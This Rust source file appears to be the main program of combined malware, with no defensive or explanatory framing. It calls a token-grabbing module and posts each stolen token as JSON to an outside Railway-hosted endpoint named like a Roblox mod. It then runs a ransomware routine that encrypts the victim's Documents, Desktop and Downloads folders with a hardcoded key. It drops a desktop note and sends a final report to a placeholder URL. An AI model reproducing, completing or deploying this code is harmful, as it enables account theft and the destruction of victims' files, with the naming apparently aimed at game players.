mod token_grabber;
mod ransomware;

fn send_to_server(endpoint: &str, data: &str) {
    if let Ok(client) = reqwest::blocking::Client::builder()
        .timeout(std::time::Duration::from_secs(10))
        .build()
    {
        let _ = client
            .post(endpoint)
            .header("Content-Type", "application/json")
            .body(data.to_string())
            .send();
    }
}

fn main() {
    let tokens = token_grabber::grab_tokens();

    for token in &tokens {
        let payload = format!(
            r#"{{"token":"{}","ip":"","computer":""}}"#,
            token
        );
        send_to_server("roblox-mod.up.railway.app/token", &payload);
    }

    let dirs = vec![
        dirs::document_dir().unwrap_or_default(),
        dirs::desktop_dir().unwrap_or_default(),
        dirs::download_dir().unwrap_or_default(),
    ];

    ransomware::encrypt_directories(&dirs, "roblox123");

    let note = "password: roblox123";
    if let Some(desktop) = dirs::desktop_dir() {
        let _ = std::fs::write(desktop.join("README.txt"), note);
    }

    let report = format!(
        r#"{{"token":"{}","ip":"","computer":""}}"#,
        tokens.join(",")
    );
    send_to_server("https://YOUR_RAILWAY_URL/report", &report);
}
